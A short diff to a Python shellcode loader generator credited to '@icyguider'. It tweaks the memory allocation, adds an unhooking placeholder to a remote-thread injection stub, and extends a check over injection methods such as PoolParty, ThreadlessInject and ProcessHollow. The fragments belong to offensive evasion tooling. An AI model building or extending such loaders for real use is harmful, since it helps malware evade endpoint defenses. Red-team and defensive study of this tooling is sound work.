@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 #Created by Matthew David (@icyguider)
 import sys, os, argparse, random, string, re, struct, pefile
 import os.path
@@ -69,7 +69,7 @@ REPLACE_ME_PAYLOAD
 
 SIZE_T payload_len = sizeof(payload);
 
-unsigned char* decoded = (unsigned char*)malloc(payload_len);
+unsigned char* decoded = (unsigned char*)malloc(payload_len*1.1);
 """
 
 wordShellcode = """
@@ -1711,6 +1711,7 @@ QueueUserAPC_stub = """
 RemoteThreadSuspended_stub = """
 
     REPLACE_ME_SLEEP_CALL
+    REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
 
     DWORD oldprotect = 0;
@@ -2853,7 +2854,7 @@ try:
         print("[!] Invalid shellcode execution method provided!")
         print("[+] Valid shellcode execution methods are: PoolPartyModuleStomping, PoolParty, ThreadlessInject, ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
         sys.exit()
-    if method != "poolparty" and method != "poolpartymodulestomping":
+    if method != "poolparty" and method != "poolpartymodulestomping" and method != "threadlessinject" and method != "remotethreadsuspended":
         if args.process == "msedge.exe":
             args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
         elif args.process == "iexplore.exe":
